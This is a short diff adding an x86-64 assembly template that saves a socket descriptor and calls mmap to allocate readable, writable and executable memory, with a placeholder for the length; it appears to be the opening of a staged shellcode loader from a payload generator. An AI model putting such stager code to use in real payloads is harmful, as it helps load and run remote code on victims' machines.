@@ -1,0 +1,18 @@
+    ; call %rax	
+    ; arg0 (rdi)    
+    ; arg1 (rsi)	
+    ; arg2 (rdx)	
+    ; arg3 (r10)	
+    ; arg4 (r8)	
+    ; arg5 (r9)
+
+
+    push rdi                    ; save sockfd
+    xor rdi, rdi                ; address
+    mov rsi, %v  ; length
+    mov rdx, 0x7                ; PROT_READ | PROT_WRITE | PROT_EXECUTE
+    mov r10, 0x22               ; MAP_PRIVATE | MAP_ANONYMOUS
+    xor r8, r8                  ; fd
+    xor r9, r9                  ; offset
+    mov rax, 0x9                ; mmap
+    syscall
